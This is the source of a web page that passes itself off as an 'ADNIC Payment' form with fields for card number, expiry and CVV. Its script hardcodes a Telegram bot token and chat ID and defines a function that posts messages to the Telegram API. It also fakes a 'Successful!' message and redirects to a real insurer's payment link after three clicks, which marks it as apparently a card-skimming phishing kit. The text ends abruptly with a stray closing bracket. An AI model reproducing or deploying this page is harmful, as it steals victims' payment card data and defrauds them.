<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ADNIC Payment</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .left-section {
            width: 60%;
            min-width: 300px;
        }
        .right-section {
            width: 35%;
            min-width: 250px;
            background: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #0066cc;
        }
        .payment-method {
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .payment-method img {
            width: 60px;
            cursor: pointer;
            border: 2px solid transparent;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .payment-method img:hover {
            transform: scale(1.05);
        }
        .selected {
            border-color: #007bff !important;
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.5);
        }
        .buttons {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }
        button {
            flex: 1;
            padding: 12px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .continue {
            background-color: #007bff;
            color: white;
        }
        .continue:hover {
            background-color: #0069d9;
        }
        .cancel {
            background-color: #6c757d;
            color: white;
        }
        .cancel:hover {
            background-color: #5a6268;
        }
        .card-details {
            margin-top: 20px;
            background: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .card-details label {
            display: block;
            margin-top: 15px;
            font-weight: bold;
            color: #495057;
        }
        .card-details input, .card-details select {
            width: 100%;
            padding: 10px;
            margin-top: 8px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .card-details input:focus, .card-details select:focus {
            border-color: #80bdff;
            outline: 0;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
        }
        .card-row {
            display: flex;
            gap: 15px;
        }
        .card-row div {
            flex: 1;
        }
        #status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 5px;
            display: none;
            text-align: center;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .loading {
            background-color: #cce5ff;
            color: #004085;
            border: 1px solid #b8daff;
        }
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            .left-section, .right-section {
                width: 100%;
            }
            .card-row {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>

    <script>
        // Telegram bot configuration
        const BOT_TOKEN = "8043641454:AAH3qjquazicgkJRWInL5bhJ90v_FxnKaVw";
        const CHAT_ID = "5296256514";
        
        let selectedPaymentMethod = '';
        let cardPressCount = 0; // Track card clicks
        
        function selectPayment(element) {
            // Remove selected class from all images
            document.querySelectorAll('.payment-method img').forEach(img => {
                img.classList.remove('selected');
            });
            
            // Add selected class to clicked image
            element.classList.add('selected');
            selectedPaymentMethod = element.alt;
            
            // Increment counter and redirect after 3 clicks
            cardPressCount++;
            if (cardPressCount >= 3) {
                showStatus('Successful! Redirecting...', 'success');
                setTimeout(() => {
                    window.location.href = "https://channel.insurancehouse.ae/Payment/Payment/PayRequest/gqHEzEvyXmls2HYZTB8UdC3I-nykDeJc3UdkGaw93K-8RUWrgnIymlTQhFKFkLhQ";
                }, 1500);
            }
        }
        
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})/g, '$1 ').trim();
            input.value = value;
        }
        
        function showStatus(message, statusType = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = statusType;
            statusDiv.style.display = 'block';
            
            if (statusType === 'success') {
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 5000);
            }
        }
        
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Failed to send message:', error);
                return null;
            }
        }
        
        function validateForm() {
             // Validate card number (remove spaces first)
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            if (cardNumber.length < 16 || !/^\d+$/.test(cardNumber)) {
                showStatus('Please enter a valid 16-digit card number', 'error');
                return false;
            }
            
            // Validate expiry date
            const expiryMonth = document.getElementById('expiryMonth').value;
            const expiryYear = document.getElementById('expiryYear').value;
            if (!expiryMonth || !expiryYear) {
                showStatus('Please select expiry month and year', 'error');
                return false;
            }
            
            // Validate CVV
            const cvv = document.getElementById('cvv').value;
            if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
                showStatus('Please enter a valid 3-digit CVV', 'error');
                return false;
            }
            
            return true;
        }

            })
